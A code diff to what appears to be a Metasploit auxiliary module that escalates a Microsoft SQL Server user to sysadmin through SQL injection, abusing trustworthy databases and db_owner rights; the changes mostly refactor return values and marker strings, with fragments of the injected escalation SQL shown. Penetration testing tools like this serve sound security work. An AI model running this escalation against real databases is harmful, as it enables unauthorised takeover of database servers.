@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
     # Grab sysadmin status
     print_status("Checking if #{db_user} is already a sysadmin...")
     sysadmin_status = check_sysadmin
-    if sysadmin_status == 1
+    if sysadmin_status == true
       print_good("#{db_user} is already a sysadmin, no esclation needed.")
       return
     else
@@ -54,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
     # Check for trusted databases owned by sysadmins
     print_status("Checking for trusted databases owned by sysadmins...")
     trust_db_list = check_trust_dbs
-    if trust_db_list.nil? || trust_db_list.length == 0
+    if !trust_db_list || trust_db_list.length == 0
       print_error('No databases owned by sysadmin were found flagged as trustworthy.')
       return
     else
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Auxiliary
     # Check if the user has the db_owner role in any of the databases
     print_status("Checking if #{db_user} has the db_owner role in any of them...")
     dbowner_status = check_db_owner(trust_db_list)
-    if dbowner_status.nil?
+    if !dbowner_status
       print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
       return
     else
@@ -83,8 +83,9 @@ class Metasploit3 < Msf::Auxiliary
 
     # Attempt to escalate to sysadmin
     print_status("Attempting to add #{db_user} to sysadmin role...")
-    escalate_status = escalate_privs(dbowner_status,db_user)
-    if escalate_status == 1
+    escalate_privs(dbowner_status,db_user)
+    sysadmin_status = check_sysadmin
+    if sysadmin_status == true
       print_good("Success! #{db_user} is now a sysadmin!")
     else
       print_error("Fail buckets, something went wrong.")
@@ -120,12 +121,16 @@ class Metasploit3 < Msf::Auxiliary
     parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first
 
     # Return sysadmin status
-    return parsed_result.to_i
+    if parsed_result.to_i == 1
+      return true
+    else
+      return false
+    end
   end
 
   def check_trust_dbs
     # Setup query to check for trusted databases owned by sysadmins
-    sql = "(select cast((SELECT 'EVILSQLISTART'+d.name+'EVILSQLISTOP' as DbName
+    sql = "(select cast((SELECT 'EVILSTART'+d.name+'EVILSTOP' as DbName
       FROM sys.server_principals r
       INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
       INNER JOIN sys.server_principals p ON
@@ -137,10 +142,7 @@ class Metasploit3 < Msf::Auxiliary
     result = mssql_query(sql)
 
     #Parse results
-    parsed_result = result.body.scan(/EVILSQLISTART(.*?)EVILSQLISTOP/m)
-
-    # Return sysadmin status
-    return parsed_result
+    parsed_result = result.body.scan(/EVILSTART(.*?)EVILSTOP/m)
   end
 
   def check_db_owner(trust_db_list)
@@ -162,7 +164,6 @@ class Metasploit3 < Msf::Auxiliary
       # Return sysadmin status
       return parsed_result
     end
-    nil
   end
 
   # Attempt to escalate privileges
@@ -193,11 +194,5 @@ class Metasploit3 < Msf::Auxiliary
       set @myevil3 = 'DROP PROCEDURE sp_elevate_me'
       exec(@myevil3);--"
     mssql_query(evilsql_remove)
-
-    # Check sysadmin status
-    sysadmin_status = check_sysadmin
-
-    # return parsed_result
-    return sysadmin_status.to_i
   end
 end
